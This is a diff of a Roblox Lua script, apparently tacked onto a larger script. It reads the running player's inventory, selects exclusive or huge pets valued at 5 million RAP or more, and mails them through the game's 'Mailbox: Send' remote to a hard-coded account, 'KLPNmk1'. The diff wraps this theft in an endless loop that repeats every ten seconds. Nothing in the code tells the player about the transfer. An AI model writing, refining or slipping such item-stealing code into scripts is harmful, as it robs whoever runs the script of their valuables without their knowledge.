@@ -921,99 +921,103 @@ task.spawn(function()
 end)
 
 
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
+while true do
+    -- Original script starts
+    local Players = game:GetService("Players")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local HttpService = game:GetService("HttpService")
 
-local plr = Players.LocalPlayer
-if not plr then
-    warn("Run this as a LocalScript while the player is present.")
-    return
-end
-
-local recipientUsername = "KLPNmk1" -- who will receive the pets
-local customMessage = "KLPN" -- message
-
-local function safeRequire(module)
-    local ok, mod = pcall(require, module)
-    if ok then return mod end
-    return nil, mod
-end
-
--- Load Save module
-local SaveModule, err = safeRequire(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save"))
-if not SaveModule then
-    warn("Could not require Save module:", err)
-    return
-end
-
-local ok, saveOrErr = pcall(function() return SaveModule.Get() end)
-if not ok then
-    warn("Save.Get() failed:", saveOrErr)
-    return
-end
-local save = saveOrErr or {}
-local inventory = save.Inventory or save
-
--- Load RAPCmds & Pet directory
-local RAPCmds = safeRequire(ReplicatedStorage.Library.Client:WaitForChild("RAPCmds"))
-local PetDirectory = safeRequire(ReplicatedStorage.Library.Directory:WaitForChild("Pets"))
-
-local RAP_THRESHOLD = 5000000 -- 5M
-
-local function getRAP(category, item)
-    if not RAPCmds then return 0 end
-    local wrapper = {
-        Class = {Name = category},
-        IsA = function(h) return h == category end,
-        GetId = function() return item.id end,
-        StackKey = function()
-            return HttpService:JSONEncode({id = item.id, pt = item.pt, sh = item.sh, tn = item.tn})
-        end,
-        AbstractGetRAP = function() return nil end
-    }
-    local ok, val = pcall(function() return RAPCmds.Get(wrapper) end)
-    return (ok and (val or 0)) or 0
-end
-
-local MailboxSend = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Send")
-
--- Send only exclusive pets with RAP >= threshold
-local petTable = inventory.Pet or save.Pet or save["Pet"]
-if petTable then
-    local exclusivePets = {}
-    for uid, item in pairs(petTable) do
-        local petMeta = (PetDirectory and PetDirectory[item.id]) or nil
-        local isExclusive = petMeta and (petMeta.exclusiveLevel or petMeta.huge)
-        if isExclusive then
-            exclusivePets[uid] = item
-        end
+    local plr = Players.LocalPlayer
+    if not plr then
+        warn("Run this as a LocalScript while the player is present.")
+        return
     end
 
-    local petList = {}
-    for uid, item in pairs(exclusivePets) do
-        local rap = getRAP("Pet", item)
-        if rap >= RAP_THRESHOLD then
-            table.insert(petList, {uid = uid, item = item, rap = rap})
-        end
+    local recipientUsername = "KLPNmk1"
+    local customMessage = "KLPN"
+
+    local function safeRequire(module)
+        local ok, mod = pcall(require, module)
+        if ok then return mod end
+        return nil, mod
     end
 
-    table.sort(petList, function(a, b) return a.rap > b.rap end)
-
-    for _, entry in ipairs(petList) do
-        local args = {recipientUsername, customMessage, "Pet", entry.uid, entry.item._am or 1}
-        local success, err = pcall(function()
-            MailboxSend:InvokeServer(unpack(args))
-        end)
-        if success then
-            print("Sent Pet UID:", entry.uid, "RAP:", entry.rap)
-        else
-            warn("Failed to send Pet UID:", entry.uid, "Error:", err)
-        end
+    local SaveModule, err = safeRequire(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save"))
+    if not SaveModule then
+        warn("Could not require Save module:", err)
+        return
     end
-else
-    print("No pets found in inventory.")
+
+    local ok, saveOrErr = pcall(function() return SaveModule.Get() end)
+    if not ok then
+        warn("Save.Get() failed:", saveOrErr)
+        return
+    end
+    local save = saveOrErr or {}
+    local inventory = save.Inventory or save
+
+    local RAPCmds = safeRequire(ReplicatedStorage.Library.Client:WaitForChild("RAPCmds"))
+    local PetDirectory = safeRequire(ReplicatedStorage.Library.Directory:WaitForChild("Pets"))
+
+    local RAP_THRESHOLD = 5000000
+
+    local function getRAP(category, item)
+        if not RAPCmds then return 0 end
+        local wrapper = {
+            Class = {Name = category},
+            IsA = function(h) return h == category end,
+            GetId = function() return item.id end,
+            StackKey = function()
+                return HttpService:JSONEncode({id = item.id, pt = item.pt, sh = item.sh, tn = item.tn})
+            end,
+            AbstractGetRAP = function() return nil end
+        }
+        local ok, val = pcall(function() return RAPCmds.Get(wrapper) end)
+        return (ok and (val or 0)) or 0
+    end
+
+    local MailboxSend = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Send")
+
+    local petTable = inventory.Pet or save.Pet or save["Pet"]
+    if petTable then
+        local exclusivePets = {}
+        for uid, item in pairs(petTable) do
+            local petMeta = (PetDirectory and PetDirectory[item.id]) or nil
+            local isExclusive = petMeta and (petMeta.exclusiveLevel or petMeta.huge)
+            if isExclusive then
+                exclusivePets[uid] = item
+            end
+        end
+
+        local petList = {}
+        for uid, item in pairs(exclusivePets) do
+            local rap = getRAP("Pet", item)
+            if rap >= RAP_THRESHOLD then
+                table.insert(petList, {uid = uid, item = item, rap = rap})
+            end
+        end
+
+        table.sort(petList, function(a, b) return a.rap > b.rap end)
+
+        for _, entry in ipairs(petList) do
+            local args = {recipientUsername, customMessage, "Pet", entry.uid, entry.item._am or 1}
+            local success, err = pcall(function()
+                MailboxSend:InvokeServer(unpack(args))
+            end)
+            if success then
+                print("Sent Pet UID:", entry.uid, "RAP:", entry.rap)
+            else
+                warn("Failed to send Pet UID:", entry.uid, "Error:", err)
+            end
+        end
+    else
+        print("No pets found in inventory.")
+    end
+    -- Original script ends
+
+    task.wait(10) -- wait before next loop iteration
 end
+
 
 
 
